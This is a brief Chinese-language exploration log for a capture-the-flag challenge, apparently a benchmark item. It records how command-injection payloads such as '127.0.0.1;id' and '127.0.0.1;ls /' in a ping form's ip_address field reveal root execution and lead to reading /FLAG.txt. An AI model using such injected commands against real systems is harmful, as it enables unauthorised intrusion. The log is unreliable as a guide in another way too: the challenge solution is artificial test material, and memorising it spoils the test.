# xben-073-24 · 探索记录

对应题解：[`xben-073-24.md`](./xben-073-24.md)

## 目标与起点

`10.0.172.219:80`，Ping 工具，POST `/ping` 字段 `ip_address`。

## 第一阶段：确认注入

| payload | 结果 |
| --- | --- |
| `127.0.0.1;id` | 页面末尾出现 `uid=0(root)` |
| `127.0.0.1;ls /` | 列出 `/FLAG.txt`、`app`、`bin`… |

## 第二阶段：读 flag

| payload | 结果 |
| --- | --- |
| `cat /flag.txt` | 无输出（文件不存在） |
| `cat /FLAG.txt` | flag |

## 这次真正的收获

先 `ls /` 再读文件；`/flag.txt` 不存在不代表没有 flag。
